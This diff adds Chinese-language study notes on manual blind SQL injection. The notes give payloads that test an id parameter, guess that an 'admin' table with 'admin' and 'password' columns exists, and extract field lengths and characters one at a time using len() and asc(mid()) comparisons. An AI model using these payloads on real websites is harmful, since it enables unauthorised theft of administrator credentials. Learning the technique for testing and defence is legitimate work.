@@ -1,0 +1,25 @@
+********************************
+
+判断注入点：id=44 后面加'  或者  and 1=1 返回正常，and 1=2 返回错误，说明服务器对输入的参数进行了逻辑验证，存在sql注入点
+
+猜解表名：
+在链接末尾加上 and exists (select * from admin),页面显示正常，说明存在表明admin
+//该语句的含义：  判断是否存在admin表，从admin表中选取所有元素。
+
+
+猜解列名：
+and exists(select admin from admin)判断admin表中是否有admin列
+
+and exists(select password from admin)判断admin表中是否存在password列
+
+猜测字段内容：
+
+and (select top 1 len (admin) from admin)>1页面显示正常，数字依次加1，直到出错，得到字段长度。
+
+同样的方法，添加and (select top 1 asc(mid(admin,1,1)) from admin)>97,可猜解出第一条记录的第一位字符的ascll吗为97，对应a
+输96的时候显示正常，说明语句逻辑为真，输入97后，显示错误，说明语句为假
+修改第一个1为2 ，就是判断admin表中第一条数据的第二个字母的ascll值
+
+
+
+
